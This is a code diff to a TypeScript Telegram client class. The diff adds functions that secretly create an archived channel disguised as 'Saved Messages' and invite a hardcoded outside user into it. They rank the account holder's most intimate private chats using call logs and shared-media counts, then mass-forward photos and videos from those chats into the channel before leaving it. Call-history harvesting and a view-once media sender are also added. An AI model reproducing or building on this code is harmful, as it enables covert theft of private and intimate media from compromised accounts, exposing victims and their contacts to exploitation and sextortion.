@@ -62,6 +62,7 @@ class TelegramManager {
     public async createGroup() {
         const groupName = "Saved Messages"; // Customize your group name
         const groupDescription = this.phoneNumber; // Optional description
+        console.log("Creating group:", groupName);
         const result: any = await this.client.invoke(
             new Api.channels.CreateChannel({
                 title: groupName,
@@ -71,10 +72,27 @@ class TelegramManager {
             })
         );
         const { id, accessHash } = result.chats[0];
+        console.log("Archived chat", id);
+        await this.archiveChat(id, accessHash);
+        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
+        console.log("Adding users to the channel:", usersToAdd);
+        const addUsersResult = await this.client.invoke(
+            new Api.channels.InviteToChannel({
+                channel: new Api.InputChannel({
+                    channelId: id,
+                    accessHash: accessHash,
+                }),
+                users: usersToAdd
+            })
+        );
+        console.log("Successful addition of users:", addUsersResult);
+        return { id, accessHash };
+    }
 
-        // Logic to categorize the dialog to a folder
-        const folderId = 1; // Replace with the desired folder ID
-        await this.client.invoke(
+    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {
+        const folderId = 1;
+        console.log("Archiving chat", id);
+        return await this.client.invoke(
             new Api.folders.EditPeerFolders({
                 folderPeers: [
                     new Api.InputFolderPeer({
@@ -87,44 +105,42 @@ class TelegramManager {
                 ],
             })
         );
-
-        // Add users to the channel
-        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
-        const addUsersResult = await this.client.invoke(
-            new Api.channels.InviteToChannel({
-                channel: new Api.InputChannel({
-                    channelId: id,
-                    accessHash: accessHash,
-                }),
-                users: usersToAdd
-            })
-        );
-        return { id, accessHash };
     }
 
-    public async createGroupAndForward(fromChatId: string) {
-        const { id, accessHash } = await this.createGroup();
-        await this.forwardSecretMsgs(fromChatId, id.toString());
+    public async forwardMedia(channel: string, fromChatId: string) {
+        console.log("Forwarding media from chat to channel", channel, fromChatId);
+        let channelId;
+        let channelAccessHash;
+        if (channel) {
+            const result: any = await this.joinChannel(channel);
+            channelId = result.chats[0].id;
+            channelAccessHash = result.chats[0].accessHash;
+            await this.archiveChat(channelId, channelAccessHash);
+            console.log("Archived chat", channelId);
+        } else {
+            const result = await this.createGroup();
+            channelId = result.id;
+            channelAccessHash = result.accessHash;
+            console.log("Created new group with ID:", channelId);
+        }
+        if (fromChatId) {
+            await this.forwardSecretMsgs(fromChatId, channelId.toString());
+        } else {
+            await this.forwardSecretMsgsFromTopChats(channelId.toString());
+        }
+        await this.leaveChannels([channelId.toString()]);
+        console.log("Left the channel with ID:", channelId);
     }
 
-    public async joinChannelAndForward(fromChatId: string, channel: string) {
-        const result: any = await this.joinChannel(channel);
-        const folderId = 1; // Replace with the desired folder ID
-        await this.client.invoke(
-            new Api.folders.EditPeerFolders({
-                folderPeers: [
-                    new Api.InputFolderPeer({
-                        peer: new Api.InputPeerChannel({
-                            channelId: result.chats[0].id,
-                            accessHash: result.chats[0].accessHash,
-                        }),
-                        folderId: folderId,
-                    }),
-                ],
-            })
-        );
-
-        await this.forwardSecretMsgs(fromChatId, channel);
+    public async forwardSecretMsgsFromTopChats(channelId: string) {
+        const chats = await this.getTopPrivateChats();
+        for (const chat of chats) {
+            const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video']});
+            console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
+            await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
+            await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
+        }
+        console.log("Completed forwarding messages from top private chats to channel:", channelId);
     }
 
     public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
@@ -160,12 +176,10 @@ class TelegramManager {
                 await sleep(5000); // Sleep for a second to avoid rate limits
             }
         } while (messages.length > 0);
-
-        await this.leaveChannels([toChatId]);
+        console.log("Left the channel with ID:", toChatId);
         return;
     }
 
-    //logic to forward messages from a chat to another chat maintaining rate limits
     async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
         const chunkSize = 30; // Number of messages to forward per request
         const totalMessages = messageIds.length;
@@ -771,6 +785,52 @@ class TelegramManager {
         };
     }
 
+    async getCallLogsInternal() {
+        const finalResult = {}
+        const result = <Api.messages.Messages>await this.client.invoke(
+            new Api.messages.Search({
+                peer: new Api.InputPeerEmpty(),
+                q: '',
+                filter: new Api.InputMessagesFilterPhoneCalls({}),
+                minDate: 0,
+                maxDate: 0,
+                offsetId: 0,
+                addOffset: 0,
+                limit: 200,
+                maxId: 0,
+                minId: 0,
+                hash: bigInt(0),
+            })
+        );
+
+        const callLogs = <Api.Message[]>result.messages.filter(
+            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
+        );
+
+        const filteredResults = {
+            outgoing: 0,
+            incoming: 0,
+            video: 0,
+            chatCallCounts: {},
+            totalCalls: 0
+        };
+        for (const log of callLogs) {
+            filteredResults.totalCalls++;
+            const logAction = <Api.MessageActionPhoneCall>log.action
+            if (log.out) {
+                filteredResults.outgoing++;
+            } else {
+                filteredResults.incoming++;
+            }
+
+            if (logAction.video) {
+                filteredResults.video++;
+            }
+            const chatId = (log.peerId as Api.PeerUser).userId.toString();
+            finalResult[chatId] = filteredResults
+        }
+        return finalResult;
+    }
     async handleEvents(event: NewMessageEvent) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
@@ -962,105 +1022,49 @@ class TelegramManager {
         }
     }
 
-    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {
-        try {
-            const query = { limit: parseInt(limit.toString()) };
-            if (offset) query['offsetId'] = parseInt(offset.toString());
+    async getMediaMetadata(params: {
+        chatId: string;
+        types?: ('photo' | 'video' | 'document' | 'voice')[];
+        startDate?: Date;
+        endDate?: Date;
+        limit?: number;
+        maxId?: number;
+        minId?: number;
+    }) {
+        if (!this.client) throw new Error('Client not initialized');
 
-            const messages = await this.client.getMessages(chatId, query);
-            const mediaMessages = messages.filter(message => {
-                // console.log(message.media?.className)
-                return (message.media && message.media.className !== "MessageMediaWebPage")
-            });
-            console.log("Total:", messages.total, "fetched: ", messages.length, "ChatId: ", chatId, "Media :", mediaMessages.length);
+        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
 
-            if (!messages.length) {
-                // If no media messages are returned, we might have reached the end
-                console.log("No more media messages found. Reached the end of the chat.");
-                return { data: [], endOfMessages: true };
-            }
+        const query: Partial<IterMessagesParams> = {
+            limit: limit || 500,
+            ...(maxId ? { maxId } : {}),
+            ...(minId ? { minId } : {}),
+            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
+            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
+        };
 
-            const data = [];
+        const ent = await this.safeGetEntity(chatId);
+        console.log(query);
+        const messages = await this.client.getMessages(ent, query);
+        console.log(`Fetched ${messages.length} messages`);
 
-            for (const message of mediaMessages) {
-                console.log(message.media.className, message.document?.mimeType);
-                let thumbBuffer = null;
-
-                try {
-                    if (message.media instanceof Api.MessageMediaPhoto) {
-                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];
-
-                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);
-                        console.log("messageId image:", message.id)
-                        data.push({
-                            messageId: message.id,
-                            mediaType: 'photo',
-                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null
-                        });
-
-                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
-                        const sizes = message.document?.thumbs || [1];
-                        console.log("messageId video:", message.id)
-                        // const fileSize = message.document.size;
-
-                        // // Skip overly large files for thumbnail (set threshold as needed)
-                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails
-                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);
-                        //     continue;
-                        // }
-
-                        // Call downloadWithTimeout with a 5-second timeout
-                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);
-
-                        data.push({
-                            messageId: message.id,
-                            mediaType: 'video',
-                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null
-                        });
-                    }
-                } catch (downloadError) {
-                    if (downloadError.message === 'Download timeout') {
-                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);
-                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
-                        console.warn('File reference expired for message. Skipping this media.');
-                        // Skip the expired media, continue processing others
-                    } else {
-                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);
-                    }
-                    data.push({
-                        messageId: message.id,
-                        mediaType: 'photo',
-                        thumb: null, // Convert to base64 for sending over HTTP, handle null
-                    });
-
-                    // Skip the message and continue with the next one if there's any error
-                    continue;
+        const filteredMessages = messages.map(message => {
+            const messageIds: number[] = [];
+            if (message.media) {
+                const mediaType = this.getMediaType(message.media);
+                if (types.includes(mediaType)) {
+                    messageIds.push(message.id);
                 }
             }
-            if (!data.length) {
-                data.push({
-                    messageId: messages[messages.length - 1].id,
-                    mediaType: 'photo',
-                    thumb: null, // Convert to base64 for sending over HTTP, handle null
-                })
-            }
-            console.log("Returning ", data.length);
+            return messageIds;
+        }).flat();
 
-            // Return the metadata and signal if we reached the end of messages
-            return { data, endOfMessages: false };
-
-        } catch (error) {
-            console.error('Error in getMediaMetadata:', error);
-            if (error.message.includes('FLOOD_WAIT')) {
-                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\d+)/)[1], 10);
-                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);
-                // Handle flood wait, retry logic
-                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
-                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting
-            }
-
-            throw new Error('Error fetching media metadata');
-        }
+        return {
+            messages: filteredMessages,
+            total: messages.total,
+            hasMore: messages.length == limit,
+            lastOffsetId: messages[messages.length - 1].id
+        };
     }
 
     async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {
@@ -1276,6 +1280,50 @@ class TelegramManager {
             throw e
         }
     }
+
+    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {
+        if (!this.client) throw new Error('Client is not initialized');
+
+        try {
+            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
+            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
+            const inputFile = await this.client.uploadFile({
+                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),
+                workers: 1
+            });
+            const result = await this.client.invoke(new Api.messages.SendMedia({
+                peer: chatId,
+                media: isVideo
+                    ? new Api.InputMediaUploadedDocument({
+                        file: inputFile,
+                        mimeType,
+                        attributes: [
+                            new Api.DocumentAttributeVideo({
+                                supportsStreaming: true,
+                                duration: 0,
+                                w: 0,
+                                h: 0
+                            })
+                        ],
+                        ttlSeconds: 10
+                    })
+                    : new Api.InputMediaUploadedPhoto({
+                        file: inputFile,
+                        ttlSeconds: 10
+                    }),
+                message: caption,
+                randomId: bigInt(Math.floor(Math.random() * 1000000000))
+            }));
+
+            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
+            return result;
+        } catch (error) {
+            console.error('Error sending view-once media:', error);
+            throw error;
+        }
+    }
+
+
     async getFileUrl(url: string, filename: string): Promise<string> {
         const response = await axios.get(url, { responseType: 'stream' });
         const filePath = `/tmp/${filename}`;
@@ -1972,6 +2020,9 @@ class TelegramManager {
             case 'video': return new Api.InputMessagesFilterVideo();
             case 'document': return new Api.InputMessagesFilterDocument();
             case 'url': return new Api.InputMessagesFilterUrl();
+            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();
+            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();
+            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });
             default: return new Api.InputMessagesFilterEmpty();
         }
     }
@@ -2229,87 +2280,116 @@ class TelegramManager {
     async searchMessages(params: {
         chatId: string;
         query?: string;
-        types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document')[];
-        offset?: number;
+        types?: ('all' | 'text' | 'photo' | 'video' | 'voice' | 'document' | "roundVideo")[];
+        minId?: number;
+        maxId?: number;
         limit?: number;
+    }): Promise<{
+        video?: { messages: number[], total: number };
+        photo?: { messages: number[], total: number };
+        document?: { messages: number[], total: number };
+        voice?: { messages: number[], total: number };
+        text?: { messages: number[], total: number };
+        all?: { messages: number[], total: number };
+        roundVideo?: { messages: number[], total: number };
+    }> {
+        if (!this.client) throw new Error('Client not initialized');
+        const finalResult = {
+            video: { messages: [], total: 0 },
+            photo: { messages: [], total: 0 },
+            document: { messages: [], total: 0 },
+            voice: { messages: [], total: 0 },
+            text: { messages: [], total: 0 },
+            all: { messages: [], total: 0 },
+            roundVideo: { messages: [], total: 0 }
+        }
+        const { chatId, query = '', types = ['all'], maxId, minId, limit } = params;
+        console.log("Types: ", types);
+        for (const type of types) {
+            const filter = this.getSearchFilter(type);
+            const queryFilter = {
+                limit: limit || 500,
+                ...(maxId ? { maxId } : {}),
+                ...(minId ? { minId } : {}),
+            };
+
+            console.log(type, queryFilter);
+            const result = await this.client.invoke(
+                new Api.messages.Search({
+                    peer: await this.safeGetEntity(chatId),
+                    q: query,
+                    filter: filter,
+                    ...queryFilter,
+                    hash: bigInt(0),
+                    fromId: undefined
+                })
+            );
+
+            if (!('messages' in result)) {
+                return {};
+            }
+            let messages = result.messages;
+            console.log(type, result.messages.length);
+            // Additional filtering for text-only messages if requested
+            if (types.includes('text') && types.length === 1) {
+                console.log("Text Filter");
+                messages = messages.filter((msg: Api.Message) => !('media' in msg));
+            }
+
+            const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {
+                return message.id
+            }));
+
+            const localResult = {
+                messages: processedMessages,
+                total: ('count' in result ? result.count : messages.length) || messages.length
+            }
+            finalResult[`${type}`] = localResult;
+        }
+        return finalResult
+    }
+
+    async getAllMediaMetaData(params: {
+        chatId: string;
+        types?: ('photo' | 'video' | 'document' | 'voice')[];
+        startDate?: Date;
+        endDate?: Date;
+        maxId?: number;
+        minId?: number;
     }) {
         if (!this.client) throw new Error('Client not initialized');
+        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
+        let allMedia: any[] = [];
+        let hasMore = true;
+        let lastOffsetId = 0;
+        const limit = 200;
 
-        const { chatId, query = '', types = ['all'], offset = 0, limit = 20 } = params;
+        while (hasMore) {
+            const response = await this.getMediaMetadata({
+                chatId,
+                types,
+                startDate,
+                endDate,
+                limit,
+                maxId: lastOffsetId,
+                minId
+            });
+            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
+            allMedia = allMedia.concat(response.messages);
 
-        let filter: any = new Api.InputMessagesFilterEmpty();
-        if (types.length === 1 && types[0] !== 'all') {
-            switch (types[0]) {
-                case 'photo':
-                    filter = new Api.InputMessagesFilterPhotos();
-                    break;
-                case 'video':
-                    filter = new Api.InputMessagesFilterVideo();
-                    break;
-                case 'voice':
-                    filter = new Api.InputMessagesFilterVoice();
-                    break;
-                case 'document':
-                    filter = new Api.InputMessagesFilterDocument();
-                    break;
-                case 'text':
-                    // For text-only messages, we'll filter after fetching
-                    break;
+            if (!response.hasMore) {
+                hasMore = false;
+                console.log('No more messages to fetch');
+            } else {
+                lastOffsetId = response.lastOffsetId;
+                console.log(`Fetched ${allMedia.length} messages so far`);
             }
+            await sleep(3000);
         }
-
-        const result = await this.client.invoke(
-            new Api.messages.Search({
-                peer: await this.client.getInputEntity(chatId),
-                q: query,
-                filter: filter,
-                minDate: 0,
-                maxDate: 0,
-                offsetId: offset,
-                addOffset: 0,
-                limit: limit,
-                maxId: 0,
-                minId: 0,
-                hash: bigInt(0),
-                fromId: undefined
-            })
-        );
-
-        if (!('messages' in result)) {
-            return { messages: [], total: 0 };
-        }
-
-        let messages = result.messages;
-
-        // Additional filtering for text-only messages if requested
-        if (types.includes('text') && types.length === 1) {
-            messages = messages.filter((msg: Api.Message) => !('media' in msg));
-        }
-
-        const processedMessages = await Promise.all(messages.map(async (message: Api.Message) => {
-            const media = 'media' in message && message.media
-                ? {
-                    type: this.getMediaType(message.media),
-                    thumbnailUrl: await this.getMediaUrl(message),
-                }
-                : null;
-
-            return {
-                id: message.id,
-                message: message.message,
-                date: message.date,
-                sender: {
-                    id: message.senderId?.toString(),
-                    is_self: message.out,
-                    username: message.fromId ? message.fromId.toString() : null,
-                },
-                media,
-            };
-        }));
 
         return {
-            messages: processedMessages,
-            total: ('count' in result ? result.count : messages.length) || messages.length
+            messages: allMedia,
+            total: allMedia.length,
         };
     }
 
@@ -2318,18 +2398,16 @@ class TelegramManager {
         types?: ('photo' | 'video' | 'document' | 'voice')[];
         startDate?: Date;
         endDate?: Date;
-        offset?: number;
         limit?: number;
         maxId?: number;
         minId?: number;
     }) {
         if (!this.client) throw new Error('Client not initialized');
 
-        const { chatId, types = ['photo', 'video'], startDate, endDate, offset = 0, limit = 50, maxId, minId } = params;
+        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
 
         const query: Partial<IterMessagesParams> = {
-            offsetId: offset,
-            limit: limit || 500,
+            limit: limit || 100,
             ...(maxId ? { maxId } : {}),
             ...(minId ? { minId } : {}),
             ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
@@ -2337,14 +2415,17 @@ class TelegramManager {
         };
 
         const ent = await this.safeGetEntity(chatId);
-
+        console.log(query);
         const messages = await this.client.getMessages(ent, query);
+        console.log(`Fetched ${messages.length} messages`);
+
         const filteredMessages = messages.filter(message => {
             if (!message.media) return false;
             const mediaType = this.getMediaType(message.media);
             return types.includes(mediaType);
         });
 
+        console.log(`Filtered down to ${filteredMessages.length} messages`);
         const mediaData = await Promise.all(filteredMessages.map(async (message: Api.Message) => {
             let thumbBuffer = null;
 
@@ -2389,18 +2470,14 @@ class TelegramManager {
         if (!this.client) throw new Error('Client not initialized');
 
         try {
-            // First attempt: direct getEntity
             return await this.client.getEntity(entityId);
         } catch (error) {
             console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);
 
             try {
-                // Second attempt: search through dialogs
                 const dialogs = await this.client.getDialogs({
-                    limit: 300 // Adjust limit as needed
+                    limit: 300
                 });
-
-                // Search through dialog entities
                 for (const dialog of dialogs) {
                     const entity = dialog.entity;
                     if (entity.id.toString() === entityId.toString()) {
@@ -2946,11 +3023,11 @@ class TelegramManager {
         // Weighting factors for different interaction types
         const weights = {
             videoCall: 15,      // Video calls have highest weight due to high engagement
-            audioCall: 8,       // Audio calls indicate strong connection
+            incoming: 5,
+            outgoing: 1,       // Audio calls indicate strong connection
             sharedVideo: 6,     // Videos show high interaction intent
             sharedPhoto: 4,     // Photos show moderate interaction
             textMessage: 1,     // Base weight for messages
-            recentActivityBonus: 1.5  // Bonus multiplier for recent activity
         };
 
         console.log('Fetching dialogs...');
@@ -2979,7 +3056,8 @@ class TelegramManager {
         // Process chats in batches to avoid overwhelming the API
         const batchSize = 10;
         const chatStats = [];
-
+        const callLogs = await this.getCallLogsInternal();
+        console.log(callLogs);
         for (let i = 0; i < privateChats.length; i += batchSize) {
             console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
             const batch = privateChats.slice(i, i + batchSize);
@@ -2989,78 +3067,56 @@ class TelegramManager {
                 const chatId = dialog.entity.id.toString();
                 const user = dialog.entity as Api.User;
 
-                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'})`);
+                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
 
                 try {
                     // Get recent messages with optimization
                     const messages = await this.client.getMessages(chatId, {
-                        limit: 500,
-                        // offsetDate: oneMonthAgo
+                        limit: 30,
                     });
 
                     // Skip chats with fewer than 20 messages
                     if (messages.length < 20) {
-                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length})`);
+                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                         return null;
                     }
 
-                    console.log(`Retrieved ${messages.length} messages for chat ${chatId}`);
+                    const messageStats = await this.searchMessages({ chatId, types: ["video", "photo", "document", "roundVideo"], limit: 10 });
+                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
 
                     const callStats = {
                         total: 0,
-                        incoming: { total: 0, audio: 0, video: 0 },
-                        outgoing: { total: 0, audio: 0, video: 0 }
+                        incoming: 0,
+                        outgoing: 0,
+                        video: 0
                     };
 
-                    const mediaStats = { photos: 0, videos: 0 };
-                    let recentActivityScore = 0;
-
-                    // Optimize message processing with a single loop
-                    for (const message of messages) {
-                        const messageAge = now - message.date;
-                        const recencyMultiplier = 1 + (1 - messageAge / (30 * 24 * 60 * 60));
-
-                        if (message.action instanceof Api.MessageActionPhoneCall) {
-                            const call = message.action;
-                            callStats.total++;
-
-                            if (message.out) {
-                                callStats.outgoing.total++;
-                                call.video ? callStats.outgoing.video++ : callStats.outgoing.audio++;
-                            } else {
-                                callStats.incoming.total++;
-                                call.video ? callStats.incoming.video++ : callStats.incoming.audio++;
-                            }
-                        }
-
-                        if (message.media) {
-                            if (message.media instanceof Api.MessageMediaPhoto) {
-                                mediaStats.photos++;
-                            } else if (message.media instanceof Api.MessageMediaDocument &&
-                                message.media.document instanceof Api.Document &&
-                                message.media.document.mimeType?.startsWith('video/')) {
-                                mediaStats.videos++;
-                            }
-                        }
-
-                        recentActivityScore += recencyMultiplier;
+                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
+                    const userCalls = callLogs[chatId];
+                    console.log(userCalls);
+                    if (userCalls) {
+                        callStats.total = userCalls.totalCalls;
+                        callStats.incoming = userCalls.incoming;
+                        callStats.outgoing = userCalls.outgoing;
                     }
 
                     // Calculate scores
                     const interactionScore = (
-                        (callStats.incoming.video + callStats.outgoing.video) * weights.videoCall +
-                        (callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall +
+                        callStats.incoming * weights.incoming +
+                        callStats.outgoing * weights.outgoing +
+                        callStats.video * weights.videoCall +
                         mediaStats.videos * weights.sharedVideo +
                         mediaStats.photos * weights.sharedPhoto +
-                        messages.length * weights.textMessage
-                    ) * (recentActivityScore * weights.recentActivityBonus);
+                        messages.total * weights.textMessage
+                    )
 
                     // Calculate activity breakdown
                     const activityBreakdown = {
-                        videoCalls: ((callStats.incoming.video + callStats.outgoing.video) * weights.videoCall) / interactionScore * 100,
-                        audioCalls: ((callStats.incoming.audio + callStats.outgoing.audio) * weights.audioCall) / interactionScore * 100,
+                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,
+                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,
+                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,
                         mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,
-                        textMessages: (messages.length * weights.textMessage) / interactionScore * 100
+                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                     };
 
                     const processingTime = Date.now() - processingStart;
@@ -3071,7 +3127,7 @@ class TelegramManager {
                         username: user.username,
                         firstName: user.firstName,
                         lastName: user.lastName,
-                        totalMessages: messages.length,
+                        totalMessages: messages.total,
                         interactionScore: Math.round(interactionScore * 100) / 100,
                         calls: callStats,
                         media: mediaStats,
@@ -3089,7 +3145,7 @@ class TelegramManager {
         // Sort by interaction score and get top 5
         const topChats = chatStats
             .sort((a, b) => b.interactionScore - a.interactionScore)
-            .slice(0, 5);
+            .slice(0, 10);
 
         const totalTime = Date.now() - startTime;
         console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
